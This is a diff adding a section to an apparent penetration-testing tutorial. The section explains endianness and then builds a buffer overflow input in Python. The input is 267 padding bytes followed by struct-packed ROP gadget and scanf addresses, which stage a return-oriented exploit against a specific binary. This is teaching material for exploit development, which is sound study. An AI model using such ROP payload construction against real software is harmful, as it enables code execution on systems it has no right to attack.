@@ -59,10 +59,80 @@ Here are some more links, some of which extend far beyond what a normal penteste
 
 * `Developer Guides, Manuals & ISA Documents <http://developer.amd.com/resources/documentation-articles/developer-guides-manuals/>`_
 
+
+.. _endian:
+
 Endianness
 ----------
 
 `Endianness <https://en.wikipedia.org/wiki/Endianness>`_ "refers to the order of the bytes, comprising a digital word, in computer memory. ... Intel x86 processors use little-endian." Take the hex value 0x12345678: the little-endian representation as consecutive bytes would be 0x78, 0x56, 0x34, then 0x12. Remember that shellcode is often input as a string, so byte order is important.
+
+
+Writing down numbers
+^^^^^^^^^^^^^^^^^^^^
+
+When writing down numbers in a left-to-right language the most significant digit comes first. This is writing in big-endian format. So the current year as of this writing is "2018" and not the little-endian format of "8102".
+
+Similarly for hex representation we would write "0x7e2" and not "0x2e7".
+
+
+Consequences of computers being based on bytes
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Computers store and address bytes of information, so numbers are represented as a sequence of bytes and not a sequence of hex digits. What does this mean for the Intel (little-endian) architecture?
+
+Consider 0x12345678 being stored in the little-endian (Intel) format. It's stored as a sequence of 4 bytes, starting with the least-significant byte: 0x78, 0x56, 0x34, 0x12.
+
+First note that whenever you're writing a number to be stored in any length of number in a computer, you write it down in big-endian format. So when you break 0x12345678 into 4 bytes you first get bytes 0x12, 0x34, 0x56, 0x78. Then rearrange those bytes into little endian order to get 0x78, 0x56, 0x34, 0x12. Note that when converted to bytes you still write the byte value big-endian, so the result is *not* 87654321, but 78563412. If the computer had 4 bit bytes it would be 87654321, but it has 8 bit bytes and so 78563412 is used.
+
+
+Python-based buffer overflow considerations
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+To exploit a buffer overflow overflow using Python involves creating a carefully crafted input file often represented as a list []. Here we show an example input file that consists of the input "42\n" followed by 267 X's and our exploit code. We might start out with the following Python 2 snippet:
+
+.. code-block:: python
+  :emphasize-lines: 1-3,5-6
+
+  exploit = []
+  exploit.append("42\n" )
+  exploit.append("X"*267)
+
+  outstring = "".join(exploit)
+  print(outstring)
+
+If you run the above snippet you should get the following output:
+
+.. code-block:: console
+
+  42
+  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+At this point we want to append after the X's the addresses of ROP (Return Oriented Programming) gadgets (code sections). So how do we do this? We'll use either the `Python 2 struct <https://docs.python.org/2/library/struct.html>`_ or `Python 3 struct <https://docs.python.org/3/library/struct.html>`_, which allows us to pack data together. In this case we'll be using the "I" (unsigned long = 4 byte) format in the convenience function :program:`p`. Note that items added to the buffer are pointers to the libc function :program:`scanf` or pointers to ROP gadgets.
+
+.. code-block:: python
+  :emphasize-lines: 1-3,9-17
+
+  import struct
+  def p(addr):
+      return struct.pack('<I', addr)
+
+  exploit = []
+  exploit.append("42\n" )
+  exploit.append("X"*267)
+
+  #   scanf address = 0x080483bc
+  exploit.append(p(0x080483bc))
+  #   Get rid of 2 scanf arguments, gadget 0x8048462L: pop ebx ; pop ebp ;;
+  exploit.append(p(0x8048462))
+  #   1st arg = 0x08048707, pointer to %s
+  exploit.append(p(0x08048707))
+  #   2nd arg = stage1addr, pointer into .data
+  stage1addr = 0x0804aa24
+  exploit.append(p(stage1addr))
+
+  outstring = "".join(exploit)
+  print(outstring)
 
 
 Generating shellcode
